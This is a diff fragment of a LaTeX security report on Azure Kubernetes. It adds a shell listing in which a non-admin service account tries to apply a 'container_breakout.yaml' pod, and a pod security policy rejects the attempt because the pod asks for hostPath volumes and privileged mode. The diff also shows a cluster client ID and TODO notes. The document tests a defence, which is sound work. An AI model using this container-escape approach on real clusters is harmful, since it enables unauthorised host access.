+  "resourceGroup": "kubernetes-ba-test",
+  "servicePrincipalProfile": {
+    "clientId": "bba9cd4a-35b8-4356-bf43-8b48752bf0e4",
+    "secret": null
+  },
+  "tags": null,
+  "type": "Microsoft.ContainerService/ManagedClusters",
+  "windowsProfile": null
+}
+lukas@Azure:~$ kubectl create serviceaccount --namespace testuser nonadmin-user
+serviceaccount/nonadmin-user created
+lukas@Azure:~$ kubectl create rolebinding --namespace testuser nonadmin-rolebinding --clusterrole=edit --serviceaccount=testuser:nonadmin-user
+rolebinding.rbac.authorization.k8s.io/nonadmin-rolebinding created
+lukas@Azure:~$ kubectl --as=system:serviceaccount:testuser:nonadmin-user apply -f container_breakout.yaml
+Error from server (Forbidden): error when creating "container_breakout.yaml": pods "breakout" is forbidden: unable to validate against any pod security policy: [spec.volumes[0]: Invalid value: "hostPath": hostPath volumes are not allowed to be used spec.containers[0].securityContext.privileged: Invalid value: true: Privileged containers are not allowed]
+\end{lstlisting}
+\fi
 \subsection{Demonstration with implemented security measures}
+
 %TODO: maybe show again without privileged, but with uid 0?
 
-TODO see powerpoint
+TODO move pics, listings from above here
 
 \subsection{Risk reassessment 2}
 
